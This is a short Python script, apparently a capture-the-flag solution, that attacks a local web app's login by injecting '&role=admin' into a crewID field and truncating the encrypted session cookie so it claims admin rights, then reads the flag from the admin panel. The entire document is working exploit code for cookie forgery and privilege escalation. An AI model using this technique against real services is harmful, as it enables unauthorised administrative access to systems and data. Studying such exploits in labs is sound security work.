import requests

session = requests.Session()
login_url = 'http://localhost:8000/requestAccess'

session.post(login_url, data={'crewID': 'aa&role=admin     '})

sessionCookie = next(
    (cookie for cookie in session.cookies if cookie.name == 'session'),
    None,
)
if sessionCookie is None:
    raise SystemExit('No session cookie returned by /requestAccess')

# Drop the last 2 blocks (role=viewer), exposing the role=admin from the crewID.
# Keep the jar's domain/path (it maps localhost to localhost.local) so requests
# replaces the existing cookie instead of adding a duplicate.
truncatedCookie = '.'.join(sessionCookie.value.split('.')[:-2])
session.cookies.set(
    'session',
    truncatedCookie,
    domain=sessionCookie.domain,
    path=sessionCookie.path,
)

response = session.get('http://localhost:8000/')
if 'Admin Panel' in response.text:
    print("Successfully logged in as admin!")
    # Extract flag from response
    for line in response.text.splitlines():
        if 'flag' in line:
            print("Flag found:", line)
            break
else:
    print("Failed to log in as admin.")
